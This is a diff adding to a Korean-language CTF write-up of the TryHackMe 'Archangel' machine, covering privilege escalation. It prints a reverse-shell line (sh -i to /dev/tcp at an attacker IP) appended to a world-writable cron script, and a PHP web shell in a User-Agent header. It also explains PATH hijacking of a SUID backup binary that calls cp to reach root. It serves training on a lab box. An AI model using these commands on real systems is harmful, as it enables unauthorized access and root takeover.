@@ -206,3 +206,86 @@ User-Agent: <?php system($_GET['cmd']);?>
 ![그림 1-8](/assets/image/thm_archangel/image8.png)
 - 성공적으로 웹 서버의 쉘을 획득했다.
 ## 시스템 권한 상승
+### opt 디렉터리 내 의심 파일 확인
+> opt 디렉터리는 사용자가 따로 외부 프로그램을 설치하는 경로이다.
+- opt 경로에 사용자가 임의로 생성한 디렉터리와 파일이 존재했다.
+```
+drwxrwxrwx  3 root      root      4096 Nov 20  2020 .                                          
+drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..                                         
+drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles                                
+-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
+```
+- backupfiles 디렉터리는 other권한이 주어져있지 않아 접근이 되지 않았다.
+- helloworld.sh 라는 쉘 스크립트에 풀권한이 주어져 있으며, 해당 스크립트 내에 어떠한 문자열들이 존재하는지 확인했다.
+```
+cat helloworld.sh                                                                              
+#!/bin/bash                                                                                    
+echo "hello world" >> /opt/backupfiles/helloworld.txt
+```
+- hello wold 라는 문자를 백업 디렉터리 내에 텍스트 파일에 추가하고 있다.
+### cron 작업을 하는 파일 내 악성 코드 삽입
+```
+drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles                                     
+drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret                                      
+-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
+```
+- archangel 사용자의 홈 디렉터리로 가본 결과 플래그파일과 두 개의 디렉터리가 존재함
+- secret 경로는 권한이 없어 myfiles 디렉터리로 이동
+- 유의미한 파일은 없었음
+- 파일을 추가하는 내용을 보다보니 >>(추가) 를 하는 걸로 보아 cron작동이 의심스러워 크론 작업을 확인해보았다.
+```
+cat /etc/crontab                                                                               
+# /etc/crontab: system-wide crontab                                                            
+# Unlike any other crontab you don't have to run the `crontab'                                 
+# command to install the new version when you edit this file                                   
+# and files in /etc/cron.d. These files also have username fields,                             
+# that none of the other crontabs do.                                                          
+                                                                                            
+SHELL=/bin/sh                                                                                  
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin                              
+                                                                                            
+# m h dom mon dow user  command                                                                
+*/1 *   * * *   archangel /opt/helloworld.sh                                                   
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly                            
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.dail
+y )                                                                                            
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.week
+ly )                                                                                           
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.mont│
+hly )                                                                                          
+# 
+```
+- 1분 주기로 helloworld.sh가 archangel 권한으로 실행되고 있다.
+- 또한 해당 파일은 풀 권한이므로 쓰기가 가능하다.
+- 즉, 공격자 PC에서 포트를 열고 해당 파일에 공격자 포트로 접속을 시도하도록 Reverse Connection이 이루어지도록 코드 삽입이 가능하다.
+```
+www-data@ubuntu:/opt$ echo 'sh -i >& /dev/tcp/10.4.47.45/5252 0>&1' >> helloworld.sh            
+< >& /dev/tcp/10.4.47.45/5252 0>&1' >> helloworld.sh                                            
+www-data@ubuntu:/opt$ cat helloworld.sh                                                         
+cat helloworld.sh                                                                               
+#!/bin/bash                                                                                     
+echo "hello world" >> /opt/backupfiles/helloworld.txt                                           
+sh -i >& /dev/tcp/10.4.47.45/5252 0>&1
+```
+![그림 1-9](/assets/image/thm_archangel/image9.png)
+- 성공적으로 archange 사용자의 권한을 획득했다.
+```
+archangel@ubuntu:~/secret$ ls -l
+│ls -l
+│-rwsr-xr-x 1 root root 16904 Nov 18  2020 backup
+│-rw-r--r-- 1 root root    49 Nov 19  2020 user2.txt
+```
+ - 플래그 파일과 backup 파일이 존재
+ - backup 파일에 SUID가 설정되어 있으며, root 소유자로 되어있다. 해당 파일에 어떠한 문자열들이 존재하는지 확인 해보았다.
+ ### 실행 파일 내 시스템 명령어 절대경로 미사용 확인
+ ```
+ cp /home/user/archangel/myfiles/* /opt/backupfiles
+ ```
+ - 파일 내 문자열 중 CP 명령어를 사용하는 부분이 확인 되었으며, 
+ - 이 때 CP명령어가 절대경로가 아닌 $PATH 에 등록되어 있는 경로대로 사용하도록 되어있다.
+## 관리자 권한 획득
+- SHELL 을 실행시키는 임의의 파일을 생성 후 파일 명을 CP로 생성한 후 $PATH 경로를 조작하면
+- SUID가 설정되어 있는 backup 파일을 실행시킬 경우 파일 소유자인 root 권한으로 실행되며, root 쉘이 획득된다.
+![그림 1-10](/assets/image/thm_archangel/image10.png)
+- cp 명령어 사용시 참조하는 절대 경로를 조작하여,
+./backup 파일 실행시 cp 명령어가 실행되며, 공격자가 임의 생성한 cp 파일을 실행하여 관리자 권한인 root 권한을 획득할 수 있다.
